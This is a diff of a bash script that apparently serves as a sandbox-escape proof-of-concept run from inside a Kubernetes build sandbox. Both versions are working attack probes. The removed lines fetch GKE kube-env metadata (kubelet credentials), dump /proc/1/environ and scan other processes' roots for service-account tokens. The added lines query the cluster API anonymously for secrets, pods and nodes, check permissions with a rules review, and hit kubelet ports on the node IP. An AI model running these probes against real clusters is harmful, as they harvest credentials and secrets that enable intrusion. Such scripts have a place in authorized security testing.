@@ -1,49 +1,48 @@
 #!/usr/bin/env bash
-# Sandbox escape ATTEMPT. Read-only probes only; no sysctl/cgroup writes, no kernel exploits.
+# K8s API reachable from the build sandbox -- what does system:anonymous get?
+# READ-ONLY: GETs plus SelfSubjectRulesReview (non-mutating). No writes, no deletes.
 set +e
 B="YEXTPOC7731"; echo "$B-BEGIN"
-MD=http://169.254.169.254/computeMetadata/v1
-H='Metadata-Flavor: Google'
+MD=http://169.254.169.254/computeMetadata/v1; H='Metadata-Flavor: Google'
+K=https://kubernetes.default.svc
 
-echo "$B === A. GKE NODE METADATA ATTRIBUTES (kube-env = kubelet creds) ==="
-echo "--- attribute index ---"
-curl -s -m 8 -H "$H" "$MD/instance/attributes/" 2>&1 | head -40
-for A in kube-env kubeconfig cluster-name cluster-location cluster-uid \
-         kubelet-config instance-template created-by; do
-  echo "--- attributes/$A ---"
-  curl -s -m 8 -H "$H" "$MD/instance/attributes/$A" 2>&1 | head -c 700; echo
-done
+echo "$B === 0. NETWORK FACTS ==="
+cat /etc/resolv.conf 2>&1 | head -5
+NODEIP=$(curl -s -m 6 -H "$H" "$MD/instance/network-interfaces/0/ip" 2>&1); echo "node ip = $NODEIP"
+getent hosts kubernetes.default.svc 2>&1
+getent hosts kubernetes.default.svc.cluster.local 2>&1
 
-echo "$B === B. PID NAMESPACE LEAKAGE ==="
-echo "pid count: $(ls -d /proc/[0-9]* 2>/dev/null | wc -l)"
-ls -d /proc/[0-9]* 2>/dev/null | head -20
-echo "--- /proc/1 ---"
-cat /proc/1/cmdline 2>&1 | tr '\0' ' '; echo
-cat /proc/1/environ 2>&1 | tr '\0' '\n' | head -10
-echo "--- can we read ANY other container's SA token via /proc/<pid>/root ? ---"
-for P in $(ls -d /proc/[0-9]* 2>/dev/null | head -40); do
-  T="$P/root/var/run/secrets/kubernetes.io/serviceaccount/token"
-  [ -r "$T" ] && { echo "READABLE: $T"; head -c 120 "$T"; echo; }
-done
-echo "(end of /proc scan)"
+echo "$B === 1. K8S API AS system:anonymous ==="
+k(){ printf '%-56s ' "$1"; curl -sk -m 10 -o - -w ' [HTTP %{http_code}]' "$K$1" 2>&1 | tr -d '\n' | head -c 320; echo; }
+k /version
+k /api
+k /apis
+k /api/v1/namespaces
+k /api/v1/pods
+k /api/v1/secrets
+k /api/v1/namespaces/live-preview-sbx/secrets
+k /api/v1/namespaces/live-preview-sbx/pods
+k /api/v1/namespaces/kube-system/secrets
+k /api/v1/nodes
+k /healthz
+k /metrics
 
-echo "$B === C. MOUNTINFO (host paths) + WRITABILITY ==="
-cat /proc/self/mountinfo 2>&1 | head -25
-echo "--- /proc/sys and /sys write test (stat only, no write) ---"
-for F in /proc/sys/kernel/core_pattern /proc/sysrq-trigger /sys/kernel/uevent_helper; do
-  printf '%-40s ' "$F"; [ -w "$F" ] && echo "WRITABLE" || echo "not writable"
-done
-mount 2>&1 | grep -E 'ro,|rw,' | grep -E '/proc|/sys' | head -6
+echo "$B === 2. WHAT AM I? (SelfSubjectReview / RulesReview, anonymous) ==="
+curl -sk -m 10 -X POST -H 'content-type: application/json' \
+ -o - -w ' [HTTP %{http_code}]' \
+ "$K/apis/authentication.k8s.io/v1/selfsubjectreviews" \
+ -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1 | head -c 400; echo
+curl -sk -m 10 -X POST -H 'content-type: application/json' \
+ -o - -w ' [HTTP %{http_code}]' \
+ "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+ -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"live-preview-sbx"}}' 2>&1 | head -c 600; echo
 
-echo "$B === D. KUBELET / K8S API FROM THE NODE ==="
-GW=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
-SELF=$(hostname -i 2>/dev/null)
-echo "gateway=$GW self=$SELF"
-for T in "$GW:10255/pods" "$GW:10250/pods" "$GW:10250/runningpods/"; do
-  printf 'http(s)://%-26s ' "$T"
-  curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' "https://$T" 2>&1 | tr -d '\n' | head -c 160; echo
+echo "$B === 3. KUBELET ON THE REAL NODE IP ==="
+for P in 10250 10255; do
+  printf 'https://%s:%s/pods  ' "$NODEIP" "$P"
+  curl -sk -m 8 -o - -w ' [HTTP %{http_code}]' "https://$NODEIP:$P/pods" 2>&1 | tr -d '\n' | head -c 220; echo
+  printf 'http://%s:%s/pods   ' "$NODEIP" "$P"
+  curl -s  -m 8 -o - -w ' [HTTP %{http_code}]' "http://$NODEIP:$P/pods"  2>&1 | tr -d '\n' | head -c 220; echo
 done
-printf 'k8s api kubernetes.default   '
-curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' https://kubernetes.default.svc/version 2>&1 | tr -d '\n' | head -c 160; echo
 
 echo "$B-END"; exit 0
